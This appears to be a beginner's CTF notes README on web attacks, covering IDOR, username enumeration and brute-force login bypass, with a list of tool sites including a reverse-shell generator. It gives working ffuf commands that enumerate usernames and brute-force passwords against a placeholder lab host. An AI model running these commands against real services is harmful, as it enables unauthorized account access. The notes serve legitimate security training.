# possibly_awesome_ctf

Hello freinds.  
This repository will be a recording of my journey in ctf.  
I promise you that one day it will be awesome...


## web
1. Vulns & Exploits<br>
   * IDOR (Insecure Direct Object Reference)<br>
     * How to find IDOR vulnerabilities<br>
       -Query Component ex. https://website.com/profile?id=12 or https://onlinestore.com/order/1234/invoice<br><br>
       -Post Variables ex. `<form method="POST" action="/update-password">
                            <input type="hidden" name"user_id" value="123">
                            <div>New Password:</div>
                            <div><input type="password" name="new_password"></div>
                            <div><input type="submit" value="Change Password">
                            </form>`<br><br>
       -Cookies ex. `GET /user-information HTTP/1.1
                    Host: website.com
                    Cookie: user_id=9
                    User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0`<br><br>
                    
   * Auth Bypass<br>
     * Username Enum: <br>
       If there is a create user form, try creating admin and check what msg comes back. <br>
       If msg like "account with this username already exists" comes back, try ffuf.<br>
       ex. `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"`<br><br>
     
     * Brute Force: can be done w/ hydra, ffuf etc <br>
       ffuf ex. `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200`<br><br>
     
     * Logic Flaw<br><br>
     
     * Cookie Tampering<br><br>
2. Tools / Sites  
   - [csp evaluator](https://csp-evaluator.withgoogle.com/)  
   - [certificate transparency log](https://crt.sh/) 
   - [hash cracker](https://crackstation.net/)
   - [base64 decoder/encoder](https://www.base64decode.org/)
   - [CyberChef(decrypt/encrypt)](https://gchq.github.io/CyberChef/)
   - [RevShell](https://www.revshells.com/)
